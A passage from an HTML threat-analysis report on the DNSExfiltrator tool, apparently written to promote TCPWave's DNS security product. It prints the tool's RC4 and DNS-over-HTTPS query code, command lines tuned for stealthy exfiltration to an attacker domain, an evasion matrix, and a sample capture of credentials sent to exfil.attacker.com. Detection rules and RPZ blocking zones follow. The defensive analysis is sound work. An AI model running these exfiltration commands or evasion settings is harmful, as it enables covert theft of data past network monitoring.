            S[i] = S[j];
            S[j] = temp;
        }
    }

    <span class="highlight-keyword">public byte</span>[] <span class="highlight-function">Process</span>(<span class="highlight-keyword">byte</span>[] data) {
        <span class="highlight-comment">// Pseudo-Random Generation Algorithm (PRGA)</span>
        <span class="highlight-keyword">byte</span>[] result = <span class="highlight-keyword">new byte</span>[data.Length];

        <span class="highlight-keyword">for</span> (<span class="highlight-keyword">int</span> n = <span class="highlight-number">0</span>; n &lt; data.Length; n++) {
            x = (x + <span class="highlight-number">1</span>) % <span class="highlight-number">256</span>;
            y = (y + S[x]) % <span class="highlight-number">256</span>;

            <span class="highlight-comment">// Swap S[x] and S[y]</span>
            <span class="highlight-keyword">byte</span> temp = S[x];
            S[x] = S[y];
            S[y] = temp;

            <span class="highlight-comment">// XOR with keystream byte</span>
            result[n] = (<span class="highlight-keyword">byte</span>)(data[n] ^ S[(S[x] + S[y]) % <span class="highlight-number">256</span>]);
        }

        <span class="highlight-keyword">return</span> result;
    }
}

<span class="highlight-comment">// Usage in DNSExfiltrator</span>
<span class="highlight-keyword">string</span> password = <span class="highlight-string">"secretkey"</span>;
<span class="highlight-keyword">byte</span>[] key = Encoding.UTF8.GetBytes(password);
RC4 cipher = <span class="highlight-keyword">new</span> RC4(key);
<span class="highlight-keyword">byte</span>[] encrypted = cipher.Process(compressedData);</pre>
        </div>

        <h3>Encryption Flow</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
    ENCRYPTION PIPELINE (Client Side)
    ==================================

    Original File (secret.docx)
            |
            v
    +-------------------+
    | Read File Bytes   |  --> Raw binary data
    +-------------------+
            |
            v
    +-------------------+
    | GZip Compression  |  --> Reduce size, add entropy
    +-------------------+
            |
            v
    +-------------------+
    | RC4 Encryption    |  --> XOR with keystream
    | (password-based)  |      Password: "secretkey"
    +-------------------+
            |
            v
    +-------------------+
    | Base64URL Encode  |  --> DNS-safe characters
    +-------------------+
            |
            v
    +-------------------+
    | Chunk into DNS    |  --> Max 63 chars per label
    | Query Labels      |
    +-------------------+
            |
            v
    DNS Query: abc123xyz.0.mydomain.com


    DECRYPTION PIPELINE (Server Side)
    ==================================

    Received DNS Queries
            |
            v
    +-------------------+
    | Reassemble Chunks |  --> Order by sequence number
    +-------------------+
            |
            v
    +-------------------+
    | Base64URL Decode  |  --> Binary data
    +-------------------+
            |
            v
    +-------------------+
    | RC4 Decryption    |  --> Same keystream (password)
    +-------------------+
            |
            v
    +-------------------+
    | GZip Decompress   |  --> Original file bytes
    +-------------------+
            |
            v
    Reconstructed File (secret.docx)
            </pre>
        </div>
    </div>

    <!-- Section 7: DNS over HTTPS (DoH) -->
    <div class="section" id="doh">
        <h2>7. DNS over HTTPS (DoH) Evasion</h2>

        <h3>Why DoH is Dangerous for Detection</h3>
        <div class="alert-box alert-danger">
            <div class="alert-title">Critical Security Concern</div>
            <p>DNS over HTTPS (DoH) encrypts DNS queries within HTTPS traffic, making them invisible to traditional DNS monitoring tools. This completely bypasses corporate DNS servers, DNS firewalls, and DNS-based threat detection.</p>
        </div>

        <div class="grid-2">
            <div class="card">
                <div class="card-title">Traditional DNS Monitoring</div>
                <ul>
                    <li>DNS queries visible in plaintext</li>
                    <li>Corporate DNS servers see all queries</li>
                    <li>DNS firewalls can block malicious domains</li>
                    <li>SIEM can analyze DNS logs</li>
                    <li>RPZ can block exfiltration domains</li>
                </ul>
            </div>
            <div class="card">
                <div class="card-title">With DoH Enabled</div>
                <ul style="color: var(--accent-red);">
                    <li>DNS queries encrypted in HTTPS</li>
                    <li>Corporate DNS bypassed entirely</li>
                    <li>DNS firewalls see nothing</li>
                    <li>Appears as normal HTTPS to port 443</li>
                    <li>RPZ completely ineffective</li>
                </ul>
            </div>
        </div>

        <h3>DNSExfiltrator DoH Implementation</h3>
        <div class="code-header">
            <span>DoH Request Construction</span>
            <span class="tag tag-red">Evasion Technique</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment">// DoH endpoint configuration</span>
<span class="highlight-keyword">const string</span> GOOGLE_DOH = <span class="highlight-string">"https://dns.google.com/resolve"</span>;
<span class="highlight-keyword">const string</span> CLOUDFLARE_DOH = <span class="highlight-string">"https://cloudflare-dns.com/dns-query"</span>;

<span class="highlight-keyword">public static string</span> <span class="highlight-function">SendDoHQuery</span>(<span class="highlight-keyword">string</span> domain, <span class="highlight-keyword">string</span> provider) {
    <span class="highlight-keyword">string</span> url;

    <span class="highlight-keyword">if</span> (provider == <span class="highlight-string">"google"</span>) {
        <span class="highlight-comment">// Google DoH uses JSON API</span>
        url = $<span class="highlight-string">"{GOOGLE_DOH}?name={domain}&type=A"</span>;
    } <span class="highlight-keyword">else</span> {
        <span class="highlight-comment">// CloudFlare DoH uses DNS wire format</span>
        url = $<span class="highlight-string">"{CLOUDFLARE_DOH}?name={domain}&type=A"</span>;
    }

    <span class="highlight-keyword">using</span> (<span class="highlight-keyword">var</span> client = <span class="highlight-keyword">new</span> WebClient()) {
        <span class="highlight-comment">// Add headers to appear as legitimate DoH request</span>
        client.Headers.Add(<span class="highlight-string">"Accept"</span>, <span class="highlight-string">"application/dns-json"</span>);
        <span class="highlight-keyword">return</span> client.DownloadString(url);
    }
}

<span class="highlight-comment">// Example DoH query for exfiltration</span>
<span class="highlight-comment">// https://dns.google.com/resolve?name=SGVsbG8.0.mydomain.com&type=A</span>
<span class="highlight-comment">//</span>
<span class="highlight-comment">// This appears as:</span>
<span class="highlight-comment">//   - Normal HTTPS traffic to dns.google.com (port 443)</span>
<span class="highlight-comment">//   - Encrypted payload - invisible to inspection</span>
<span class="highlight-comment">//   - Google's IP is typically whitelisted</span></pre>
        </div>

        <h3>DoH Traffic Flow</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
    TRADITIONAL DNS FLOW (Detectable):
    ===================================

    Victim PC --[UDP/53]--> Corporate DNS --[UDP/53]--> Recursive DNS ---> Attacker NS
                                |
                                v
                        DNS Firewall sees:
                        "SGVsbG8.0.mydomain.com"
                        *** BLOCKED/ALERTED ***


    DOH FLOW (Hidden):
    ==================

    Victim PC --[HTTPS/443]--> dns.google.com (8.8.8.8)
                                      |
                                      |  [Encrypted HTTPS]
                                      |  Contains: "SGVsbG8.0.mydomain.com"
                                      |
                                      v
                              Google DNS Servers
                                      |
                                      v
                              Attacker NS (receives query)

    Corporate DNS Firewall sees:
    "HTTPS traffic to dns.google.com"
    *** APPEARS LEGITIMATE ***


    WHAT NETWORK MONITORING SEES:
    =============================

    Without DoH:
    - Source: 192.168.1.50
    - Dest: 10.0.0.1 (Corporate DNS)
    - Port: 53/UDP
    - Query: SGVsbG8gV29ybGQh.0.mydomain.com <-- VISIBLE

    With DoH:
    - Source: 192.168.1.50
    - Dest: 8.8.8.8 (Google)
    - Port: 443/TCP
    - Payload: [ENCRYPTED TLS] <-- HIDDEN
            </pre>
        </div>

        <h3>CloudFlare DoH Specifics</h3>
        <div class="alert-box alert-warning">
            <div class="alert-title">Base32 Auto-Enabled</div>
            <p>When using CloudFlare DoH, DNSExfiltrator automatically switches to Base32 encoding because CloudFlare's DNS resolver is known to normalize domain names to lowercase, which would break Base64URL encoding.</p>
        </div>
    </div>

    <!-- Section 8: Complete Data Flow -->
    <div class="section" id="flow">
        <h2>8. Complete Data Flow Analysis</h2>

        <h3>End-to-End Exfiltration Timeline</h3>
        <div class="timeline">
            <div class="timeline-item">
                <div class="timeline-title">Phase 1: Initialization</div>
                <p>Attacker sets up infrastructure: registers domain, configures NS records to point to their server, starts dnsexfiltrator.py</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 2: Compromise</div>
                <p>Victim system is compromised via phishing, exploit, or insider threat. DNSExfiltrator client is deployed.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 3: File Selection</div>
                <p>Attacker identifies sensitive files to exfiltrate (credentials, documents, source code, etc.)</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 4: Processing</div>
                <p>Client reads file, compresses with GZip, encrypts with RC4, encodes to Base64URL/Base32</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 5: Chunking</div>
                <p>Encoded data split into chunks fitting DNS label limits (63 chars) and total query limits (255 chars)</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 6: Initial Handshake</div>
                <p>First DNS query contains metadata: filename, total size, chunk count</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 7: Data Transfer</div>
                <p>Each chunk sent as separate DNS query with sequence number. Optional throttling between queries.</p>
            </div>
            <div class="timeline-item">
                <div class="timeline-title">Phase 8: Reassembly</div>
                <p>Server collects all chunks, orders by sequence, decodes, decrypts, decompresses to recover original file</p>
            </div>
        </div>

        <h3>Protocol Sequence Diagram</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
    VICTIM CLIENT                    DNS RESOLVER                    ATTACKER SERVER
         |                                |                                |
         |  1. INIT Query                 |                                |
         |  init.secretfile.txt.1024.5.mydomain.com                        |
         |------------------------------->|                                |
         |                                |------------------------------->|
         |                                |  NS lookup for mydomain.com    |
         |                                |<-------------------------------|
         |                                |  Authoritative: attacker IP    |
         |                                |------------------------------->|
         |                                |  Forward INIT query            |
         |                                |<-------------------------------|
         |<-------------------------------|  Response: 127.0.0.1 (ACK)    |
         |                                |                                |
         |  2. DATA Chunk 0               |                                |
         |  SGVsbG8gV29ybGQh.0.mydomain.com                                |
         |------------------------------->|------------------------------->|
         |<-------------------------------|<-------------------------------|
         |                                |                                |
         |  [Throttle delay if configured]                                 |
         |                                |                                |
         |  3. DATA Chunk 1               |                                |
         |  IFRoaXMgaXMgc2Vj.1.mydomain.com                                |
         |------------------------------->|------------------------------->|
         |<-------------------------------|<-------------------------------|
         |                                |                                |
         |  ... repeat for all chunks ...                                  |
         |                                |                                |
         |  N. Final Chunk                |                                |
         |  cmV0IGRhdGEu.4.mydomain.com   |                                |
         |------------------------------->|------------------------------->|
         |<-------------------------------|<-------------------------------|
         |                                |                                |
         |                                |            Server reassembles  |
         |                                |            and saves file      |
         |                                |                                |
            </pre>
        </div>

        <h3>Data Size Calculations</h3>
        <table>
            <tr>
                <th>Original File Size</th>
                <th>After Compression</th>
                <th>After Base64URL</th>
                <th>DNS Queries Needed</th>
                <th>Est. Transfer Time*</th>
            </tr>
            <tr>
                <td>1 KB</td>
                <td>~600 bytes</td>
                <td>~800 chars</td>
                <td>~5 queries</td>
                <td>< 1 second</td>
            </tr>
            <tr>
                <td>10 KB</td>
                <td>~6 KB</td>
                <td>~8 KB</td>
                <td>~50 queries</td>
                <td>~5 seconds</td>
            </tr>
            <tr>
                <td>100 KB</td>
                <td>~60 KB</td>
                <td>~80 KB</td>
                <td>~500 queries</td>
                <td>~1 minute</td>
            </tr>
            <tr>
                <td>1 MB</td>
                <td>~600 KB</td>
                <td>~800 KB</td>
                <td>~5,000 queries</td>
                <td>~10 minutes</td>
            </tr>
            <tr>
                <td>10 MB</td>
                <td>~6 MB</td>
                <td>~8 MB</td>
                <td>~50,000 queries</td>
                <td>~2 hours</td>
            </tr>
        </table>
        <p style="font-size: 0.9em; color: var(--text-secondary);">* With 100ms throttle delay between queries</p>
    </div>

    <!-- Section 9: Packet-Level Analysis -->
    <div class="section" id="packet">
        <h2>9. Packet-Level Analysis</h2>

        <h3>DNS Query Packet Structure</h3>
        <div class="packet-diagram">
            <div class="packet-header">DNS QUERY PACKET - Exfiltration Request</div>
            <pre class="packet-data">
<span class="packet-label">ETHERNET HEADER (14 bytes)</span>
00 1a 2b 3c 4d 5e  <span class="packet-label">[Destination MAC]</span>
00 5e 4d 3c 2b 1a  <span class="packet-label">[Source MAC]</span>
08 00              <span class="packet-label">[EtherType: IPv4]</span>

<span class="packet-label">IP HEADER (20 bytes)</span>
45 00 00 5c        <span class="packet-label">[Version, IHL, Total Length: 92]</span>
12 34 00 00        <span class="packet-label">[ID, Flags, Fragment Offset]</span>
40 11 xx xx        <span class="packet-label">[TTL: 64, Protocol: UDP (17)]</span>
c0 a8 01 32        <span class="packet-label">[Source IP: 192.168.1.50]</span>
08 08 08 08        <span class="packet-label">[Dest IP: 8.8.8.8 (or corporate DNS)]</span>

<span class="packet-label">UDP HEADER (8 bytes)</span>
e4 56              <span class="packet-label">[Source Port: 58454 (random high port)]</span>
00 35              <span class="packet-label">[Dest Port: 53 (DNS)]</span>
00 48              <span class="packet-label">[Length: 72 bytes]</span>
xx xx              <span class="packet-label">[Checksum]</span>

<span class="packet-label">DNS HEADER (12 bytes)</span>
ab cd              <span class="packet-label">[Transaction ID: 0xABCD]</span>
01 00              <span class="packet-label">[Flags: Standard Query, RD=1]</span>
00 01              <span class="packet-label">[Questions: 1]</span>
00 00              <span class="packet-label">[Answers: 0]</span>
00 00              <span class="packet-label">[Authority: 0]</span>
00 00              <span class="packet-label">[Additional: 0]</span>

<span class="packet-label">DNS QUESTION SECTION</span>
<span style="color: #f85149;">10</span> 53 47 56 73 62 47 38 67 56 32 39 79 62 47 51 68  <span class="packet-label">[Length: 16, "SGVsbG8gV29ybGQh" - Base64 encoded data]</span>
<span style="color: #f85149;">01</span> 30                                              <span class="packet-label">[Length: 1, "0" - chunk number]</span>
<span style="color: #f85149;">08</span> 6d 79 64 6f 6d 61 69 6e                        <span class="packet-label">[Length: 8, "mydomain"]</span>
<span style="color: #f85149;">03</span> 63 6f 6d                                       <span class="packet-label">[Length: 3, "com"]</span>
00                                                   <span class="packet-label">[Null terminator]</span>
00 01              <span class="packet-label">[Type: A (1)]</span>
00 01              <span class="packet-label">[Class: IN (1)]</span>

<span class="packet-label">RECONSTRUCTED QUERY:</span>
SGVsbG8gV29ybGQh.0.mydomain.com
     |           |      |
     |           |      +-- Attacker domain
     |           +--------- Chunk sequence number
     +-------------------- Base64URL encoded "Hello World!"
            </pre>
        </div>

        <h3>Wireshark Filter Examples</h3>
        <div class="code-header">
            <span>Wireshark/tshark Display Filters</span>
            <span class="tag tag-blue">Detection Filters</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment"># Filter for DNS queries with long subdomains (potential exfiltration)</span>
dns.qry.name matches <span class="highlight-string">"^[a-zA-Z0-9_-]{20,}\."</span>

<span class="highlight-comment"># Filter for DNS queries to specific suspicious domain</span>
dns.qry.name contains <span class="highlight-string">"mydomain.com"</span>

<span class="highlight-comment"># Filter for high entropy DNS queries (Base64-like patterns)</span>
dns.qry.name matches <span class="highlight-string">"[A-Za-z0-9+/=_-]{30,}"</span>

<span class="highlight-comment"># Filter for DNS queries with numeric subdomain (chunk numbers)</span>
dns.qry.name matches <span class="highlight-string">"\\.[0-9]+\\."</span>

<span class="highlight-comment"># Filter for unusual DNS query volume from single host</span>
<span class="highlight-comment"># (Use Statistics > Conversations > UDP after filtering)</span>
ip.src == <span class="highlight-number">192.168.1.50</span> && dns

<span class="highlight-comment"># Filter for DoH traffic (harder to inspect but can identify hosts)</span>
http.host == <span class="highlight-string">"dns.google.com"</span> || http.host == <span class="highlight-string">"cloudflare-dns.com"</span>
tls.handshake.extensions_server_name == <span class="highlight-string">"dns.google.com"</span>

<span class="highlight-comment"># tshark command to extract DNS query names</span>
tshark -r capture.pcap -T fields -e dns.qry.name -Y <span class="highlight-string">"dns.flags.response == 0"</span></pre>
        </div>

        <h3>Sample Captured Traffic Analysis</h3>
        <div class="code-header">
            <span>Example DNS Exfiltration Session</span>
            <span class="tag tag-red">Suspicious Activity</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment"># Captured DNS queries from compromised host 192.168.1.50</span>
<span class="highlight-comment"># Target domain: exfil.attacker.com</span>

<span class="highlight-variable">Query 1:</span>  init.credentials.txt.2048.15.exfil.attacker.com
          <span class="highlight-comment">^--- Metadata: filename=credentials.txt, size=2048, chunks=15</span>

<span class="highlight-variable">Query 2:</span>  YWRtaW46cGFzc3dvcmQxMjM.0.exfil.attacker.com
          <span class="highlight-comment">^--- Chunk 0: Base64 decode = "admin:password123"</span>

<span class="highlight-variable">Query 3:</span>  cm9vdDpzdXBlcnNlY3JldA.1.exfil.attacker.com
          <span class="highlight-comment">^--- Chunk 1: Base64 decode = "root:supersecret"</span>

<span class="highlight-variable">Query 4:</span>  ZGJhZG1pbjpkYjEyMzQ1Ng.2.exfil.attacker.com
          <span class="highlight-comment">^--- Chunk 2: Base64 decode = "dbadmin:db123456"</span>

<span class="highlight-comment">... continues for 15 queries ...</span>

<span class="highlight-keyword">ANALYSIS:</span>
- Time span: 14.7 seconds (with 1000ms throttle)
- Total data exfiltrated: ~2KB of credentials
- Query pattern: Sequential chunk numbers (0, 1, 2, ...)
- Encoding: Base64URL (case-sensitive, URL-safe chars)
- All queries to same parent domain
- <span class="highlight-comment">RED FLAG: High entropy subdomains with sequential numbering</span></pre>
        </div>
    </div>

    <!-- Section 10: Evasion Techniques -->
    <div class="section" id="evasion">
        <h2>10. Evasion Techniques</h2>

        <h3>Built-in Evasion Features</h3>
        <div class="grid-2">
            <div class="card">
                <div class="card-title">Request Throttling</div>
                <p>Configurable delay between DNS queries to avoid triggering rate-based detection:</p>
                <div class="code-block" style="margin-top: 10px;">
<pre><span class="highlight-comment"># -t parameter: milliseconds between queries</span>
dnsExfiltrator.exe file.txt domain.com pass <span class="highlight-variable">t=500</span>

<span class="highlight-comment"># 500ms = 2 queries/second</span>
<span class="highlight-comment"># Appears as normal DNS activity</span>
<span class="highlight-comment"># But slows exfiltration significantly</span></pre>
                </div>
            </div>
            <div class="card">
                <div class="card-title">Request Size Reduction</div>
                <p>Smaller DNS queries blend better with normal traffic:</p>
                <div class="code-block" style="margin-top: 10px;">
<pre><span class="highlight-comment"># -r parameter: max request size in bytes</span>
dnsExfiltrator.exe file.txt domain.com pass <span class="highlight-variable">r=100</span>

<span class="highlight-comment"># Default is 255 (maximum FQDN)</span>
<span class="highlight-comment"># Smaller = more queries but less suspicious</span>
<span class="highlight-comment"># Trade-off: speed vs stealth</span></pre>
                </div>
            </div>
            <div class="card">
                <div class="card-title">Label Size Reduction</div>
                <p>Shorter subdomain labels appear more natural:</p>
                <div class="code-block" style="margin-top: 10px;">
<pre><span class="highlight-comment"># -l parameter: max label size in chars</span>
dnsExfiltrator.exe file.txt domain.com pass <span class="highlight-variable">l=20</span>

<span class="highlight-comment"># Default is 63 (DNS maximum)</span>
<span class="highlight-comment"># 20 chars looks like normal subdomain</span>
<span class="highlight-comment"># Normal: api.v2.service.domain.com</span></pre>
                </div>
            </div>
            <div class="card">
                <div class="card-title">DNS over HTTPS</div>
                <p>Complete bypass of traditional DNS monitoring:</p>
                <div class="code-block" style="margin-top: 10px;">
<pre><span class="highlight-comment"># -h parameter: DoH provider</span>
dnsExfiltrator.exe file.txt domain.com pass <span class="highlight-variable">h=google</span>
dnsExfiltrator.exe file.txt domain.com pass <span class="highlight-variable">h=cloudflare</span>

<span class="highlight-comment"># Traffic appears as HTTPS to Google/CF</span>
<span class="highlight-comment"># Corporate DNS completely bypassed</span>
<span class="highlight-comment"># RPZ and DNS firewalls ineffective</span></pre>
                </div>
            </div>
        </div>

        <h3>Advanced Evasion Matrix</h3>
        <table>
            <tr>
                <th>Detection Method</th>
                <th>Evasion Technique</th>
                <th>Effectiveness</th>
            </tr>
            <tr>
                <td>DNS Query Rate Monitoring</td>
                <td>Throttling (t=1000+)</td>
                <td><span class="tag tag-green">High</span></td>
            </tr>
            <tr>
                <td>Long Subdomain Detection</td>
                <td>Label size reduction (l=20)</td>
                <td><span class="tag tag-orange">Medium</span></td>
            </tr>
            <tr>
                <td>Entropy Analysis</td>
                <td>Base32 encoding, more queries</td>
                <td><span class="tag tag-orange">Medium</span></td>
            </tr>
            <tr>
                <td>DNS Firewall (RPZ)</td>
                <td>DNS over HTTPS</td>
                <td><span class="tag tag-red">Complete Bypass</span></td>
            </tr>
            <tr>
                <td>Pattern Matching (Signatures)</td>
                <td>RC4 encryption</td>
                <td><span class="tag tag-green">High</span></td>
            </tr>
            <tr>
                <td>Domain Reputation</td>
                <td>Fresh domains, legitimate TLDs</td>
                <td><span class="tag tag-orange">Medium</span></td>
            </tr>
            <tr>
                <td>ML-based DGA Detection</td>
                <td>Lower entropy, shorter labels</td>
                <td><span class="tag tag-orange">Partial</span></td>
            </tr>
        </table>

        <h3>Stealth Configuration Profile</h3>
        <div class="code-header">
            <span>Maximum Stealth Configuration</span>
            <span class="tag tag-red">Hard to Detect</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment"># Maximum stealth configuration</span>
dnsExfiltrator.exe sensitivedata.zip exfil.legit-looking-domain.com strongpass123 \
    <span class="highlight-variable">h=cloudflare</span>  \  <span class="highlight-comment"># Use DoH - bypasses DNS monitoring</span>
    <span class="highlight-variable">t=5000</span>        \  <span class="highlight-comment"># 5 second delay - very slow but stealthy</span>
    <span class="highlight-variable">r=80</span>          \  <span class="highlight-comment"># Short requests - appear normal</span>
    <span class="highlight-variable">l=15</span>          \  <span class="highlight-comment"># Short labels - less suspicious</span>
    <span class="highlight-variable">-b32</span>             <span class="highlight-comment"># Base32 - case insensitive, lower entropy appearance</span>

<span class="highlight-comment"># Trade-offs:</span>
<span class="highlight-comment"># - 1MB file would take ~10 hours to exfiltrate</span>
<span class="highlight-comment"># - But nearly undetectable with standard tools</span>
<span class="highlight-comment"># - Traffic appears as normal HTTPS to CloudFlare</span></pre>
        </div>
    </div>

    <!-- Section 11: Detection Strategies -->
    <div class="section" id="detection">
        <h2>11. Detection Strategies</h2>

        <h3>Multi-Layer Detection Approach</h3>
        <div class="alert-box alert-info">
            <div class="alert-title">Defense in Depth</div>
            <p>No single detection method is sufficient. Effective detection requires combining multiple techniques across network, DNS, and endpoint layers.</p>
        </div>

        <h3>Layer 1: DNS Query Analysis</h3>
        <div class="detection-rule">
            <div class="detection-rule-title">SIEM Rule: High Entropy DNS Subdomain</div>
            <pre>
rule: dns_high_entropy_subdomain
description: Detects DNS queries with high entropy subdomains indicating possible exfiltration
condition:
  - dns.query.subdomain.entropy > 3.5
  - dns.query.subdomain.length > 20
  - NOT dns.query.name IN whitelist
severity: HIGH
action: alert, log
            </pre>
        </div>

        <div class="detection-rule">
            <div class="detection-rule-title">Splunk Query: DNS Exfiltration Pattern</div>
            <pre>
index=dns sourcetype=dns
| eval subdomain=mvindex(split(query, "."), 0)
| eval subdomain_len=len(subdomain)
| eval entropy=shannon_entropy(subdomain)
| where subdomain_len > 30 AND entropy > 3.8
| stats count by src_ip, query_domain
| where count > 10
| table src_ip, query_domain, count
            </pre>
        </div>

        <h3>Layer 2: Traffic Volume Analysis</h3>
        <div class="detection-rule">
            <div class="detection-rule-title">Query Volume Threshold</div>
            <pre>
rule: dns_unusual_query_volume
description: Detects hosts sending unusually high DNS query volumes
condition:
  - dns.queries.per_minute > baseline * 3
  - dns.unique_domains.per_hour > 100
  - dns.queries.to_single_domain > 50
timeframe: 1 hour
baseline: 30-day moving average per host
severity: MEDIUM
action: alert, investigate
            </pre>
        </div>

        <h3>Layer 3: Domain Reputation & Age</h3>
        <div class="detection-rule">
            <div class="detection-rule-title">Newly Registered Domain Detection</div>
            <pre>
rule: dns_query_new_domain
description: Alerts on DNS queries to recently registered domains
condition:
  - domain.registration_age < 7 days
  - dns.query.type IN (A, AAAA, TXT)
  - domain.tld NOT IN trusted_tlds
severity: MEDIUM
enrichment: whois_lookup, passive_dns
action: alert, block if high_risk
            </pre>
        </div>

        <h3>Layer 4: Machine Learning Detection</h3>
        <div class="grid-2">
            <div class="card">
                <div class="card-title">DGA Detection Model</div>
                <p>Neural network trained on domain name features:</p>
                <ul>
                    <li>Character n-gram frequencies</li>
                    <li>Vowel/consonant ratio</li>
                    <li>Shannon entropy</li>
                    <li>Dictionary word presence</li>
                    <li>Subdomain depth</li>
                </ul>
            </div>
            <div class="card">
                <div class="card-title">Behavioral Analysis</div>
                <p>Anomaly detection on DNS behavior:</p>
                <ul>
                    <li>Query rate deviation from baseline</li>
                    <li>New domain contact patterns</li>
                    <li>TLD distribution changes</li>
                    <li>Query timing patterns</li>
                    <li>Response code analysis</li>
                </ul>
            </div>
        </div>

        <h3>Layer 5: DoH Detection</h3>
        <div class="alert-box alert-warning">
            <div class="alert-title">Detecting DoH Bypass</div>
            <p>When attackers use DNS over HTTPS, traditional DNS monitoring fails. Alternative detection methods are required.</p>
        </div>

        <div class="detection-rule">
            <div class="detection-rule-title">DoH Endpoint Detection</div>
            <pre>
rule: outbound_doh_traffic
description: Detects connections to known DoH endpoints
condition:
  - tls.sni IN ("dns.google.com", "cloudflare-dns.com", "dns.quad9.net",
                "doh.opendns.com", "dns.adguard.com")
  - OR ip.dst IN (8.8.8.8, 8.8.4.4, 1.1.1.1, 1.0.0.1, 9.9.9.9)
  - AND port == 443
  - AND src.ip NOT IN approved_hosts
severity: HIGH
action: alert, consider blocking
note: May require policy decision on DoH usage
            </pre>
        </div>

        <h3>Detection Effectiveness Matrix</h3>
        <table>
            <tr>
                <th>Detection Method</th>
                <th>vs Basic Exfil</th>
                <th>vs Throttled</th>
                <th>vs DoH</th>
                <th>False Positive Rate</th>
            </tr>
            <tr>
                <td>Entropy Analysis</td>
                <td><span class="tag tag-green">95%</span></td>
                <td><span class="tag tag-green">90%</span></td>
                <td><span class="tag tag-red">0%</span></td>
                <td>Low</td>
            </tr>
            <tr>
                <td>Query Volume</td>
                <td><span class="tag tag-green">90%</span></td>
                <td><span class="tag tag-orange">40%</span></td>
                <td><span class="tag tag-red">0%</span></td>
                <td>Medium</td>
            </tr>
            <tr>
                <td>ML DGA Detection</td>
                <td><span class="tag tag-green">85%</span></td>
                <td><span class="tag tag-green">80%</span></td>
                <td><span class="tag tag-red">0%</span></td>
                <td>Low</td>
            </tr>
            <tr>
                <td>Domain Reputation</td>
                <td><span class="tag tag-orange">60%</span></td>
                <td><span class="tag tag-orange">60%</span></td>
                <td><span class="tag tag-red">0%</span></td>
                <td>Medium</td>
            </tr>
            <tr>
                <td>DoH Endpoint Block</td>
                <td><span class="tag tag-red">N/A</span></td>
                <td><span class="tag tag-red">N/A</span></td>
                <td><span class="tag tag-green">100%</span></td>
                <td>Policy Dependent</td>
            </tr>
            <tr>
                <td>Endpoint EDR</td>
                <td><span class="tag tag-green">95%</span></td>
                <td><span class="tag tag-green">95%</span></td>
                <td><span class="tag tag-green">95%</span></td>
                <td>Low</td>
            </tr>
        </table>
    </div>

    <!-- Section 12: TCPWave Detection -->
    <div class="section" id="tcpwave">
        <h2>12. TCPWave Detection Capabilities</h2>

        <div class="alert-box alert-success">
            <div class="alert-title">TCPWave Advantage</div>
            <p>TCPWave's integrated DDI platform with AI/ML-powered threat intelligence provides comprehensive detection capabilities against DNS exfiltration techniques, including those used by DNSExfiltrator.</p>
        </div>

        <h3>ATLANTIS DGA Detection Engine</h3>
        <p>TCPWave's ATLANTIS system uses a hybrid CNN+LSTM neural network to detect DGA-generated domains and DNS tunneling:</p>

        <div class="grid-2">
            <div class="card">
                <div class="card-title">Detection Features</div>
                <ul>
                    <li><strong>18 Statistical Features</strong> per domain</li>
                    <li>Shannon entropy analysis</li>
                    <li>N-gram frequency patterns</li>
                    <li>Character distribution ratios</li>
                    <li>Pronounceability scoring</li>
                    <li>Dictionary word detection</li>
                </ul>
            </div>
            <div class="card">
                <div class="card-title">Performance Metrics</div>
                <table style="margin: 0;">
                    <tr><td>Inference Latency</td><td><strong>2-5ms</strong></td></tr>
                    <tr><td>Throughput</td><td><strong>2,000+ req/s</strong></td></tr>
                    <tr><td>Accuracy</td><td><strong>>95%</strong></td></tr>
                    <tr><td>DGA Families</td><td><strong>137 classes</strong></td></tr>
                    <tr><td>Training Data</td><td><strong>185M+ domains</strong></td></tr>
                </table>
            </div>
        </div>

        <h3>RPZ (Response Policy Zone) Integration</h3>
        <p>Automatically block detected exfiltration domains:</p>

        <div class="code-header">
            <span>TCPWave RPZ Auto-Generation</span>
            <span class="tag tag-green">Real-time Protection</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment">; TCPWave Auto-Generated RPZ - DNS Exfiltration Blocking</span>
$TTL <span class="highlight-number">60</span>
@ IN SOA rpz.tcpwave.local. admin.tcpwave.local. (
    <span class="highlight-number">2025120101</span> ; Serial
    <span class="highlight-number">3600</span>       ; Refresh
    <span class="highlight-number">1800</span>       ; Retry
    <span class="highlight-number">604800</span>     ; Expire
    <span class="highlight-number">60</span> )       ; Minimum TTL

<span class="highlight-comment">; Block detected exfiltration domain</span>
*.exfil.attacker.com CNAME .    <span class="highlight-comment">; NXDOMAIN response</span>

<span class="highlight-comment">; Block entire suspicious domain tree</span>
*.mydomain-exfil.com CNAME .

<span class="highlight-comment">; Redirect to walled garden for investigation</span>
*.suspicious-dns.net CNAME walled-garden.tcpwave.local.

<span class="highlight-comment">; TCPWave updates this zone in real-time as threats are detected</span>
<span class="highlight-comment">; Update frequency: &lt;60 seconds from detection to blocking</span></pre>
        </div>

        <h3>Statistical Outlier Detection</h3>
        <p>TCPWave's MAD-based anomaly detection identifies DNS exfiltration patterns:</p>

        <div class="code-header">
            <span>Anomaly Detection Alert</span>
            <span class="tag tag-red">DNS Tunneling Detected</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-keyword">ALERT:</span> DNS Tunneling / Exfiltration Suspected
<span class="highlight-keyword">Source IP:</span> 192.168.1.50
<span class="highlight-keyword">Detection Time:</span> 2025-12-01 10:45:23 UTC
<span class="highlight-keyword">MAD Score:</span> 12.3 (threshold: 3.5)

<span class="highlight-keyword">Anomaly Details:</span>
- Query rate: <span class="highlight-number">847</span> queries/min (baseline: <span class="highlight-number">52</span> queries/min)
- Avg subdomain entropy: <span class="highlight-number">4.21</span> (normal: &lt; <span class="highlight-number">2.5</span>)
- Unique target domain: exfil.attacker.com
- Sequential pattern detected in subdomains (0, 1, 2, 3...)
